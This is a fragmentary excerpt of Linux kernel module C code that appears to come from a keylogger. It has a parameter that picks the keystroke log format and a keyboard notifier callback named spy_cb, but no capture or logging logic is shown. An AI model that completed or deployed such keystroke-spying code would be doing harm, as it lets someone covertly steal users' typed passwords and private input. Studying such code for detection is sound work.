...
/* Register global variable @codes as a module parameter with type and
 * permissions */
module_param(codes, int, 0644);
/* Add module parameter description for @codes */
MODULE_PARM_DESC(
    codes, "log format (0:US keys (default), 1:hex keycodes, 2:dec keycodes)");
...
static int spy_cb(struct notifier_block *nblock, unsigned long code,
                  void *_param);
 ...
 * Returns NOTIFY_OK
 */
int spy_cb(struct notifier_block *nblock, unsigned long code, void *_param) {
  size_t len;
